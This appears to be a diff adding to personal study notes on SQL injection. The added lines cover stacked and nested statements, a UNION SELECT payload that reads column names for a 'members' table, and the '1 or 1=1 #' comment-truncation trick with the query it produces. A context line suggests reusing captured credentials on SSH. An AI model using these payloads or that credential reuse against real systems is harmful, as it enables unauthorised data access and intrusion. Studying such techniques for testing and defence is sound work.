@@ -52,3 +52,22 @@ DEMO NOTES:
 1
 
 It would be wise to try to use these creds to log in to an open ssh port later
+
+
+STACKING STATEMENTS:
+chaining multiple statements together using a semi-colon ;
+
+NESTING STATEMENTS:
+some web apps do not allow stacking statements, but may allow nesting
+
+php?key=<value> union select 1, column_name,3 from information_schema.columns where table name = "members"
+
+
+ignore the rest
+using # or -- tells the database to ignore everything after
+Select product from item where id = $select limit 1;
+
+1 or 1=1 #
+
+server side query becomes:
+select product from item where id = 1 or 1=1; # limit 1;
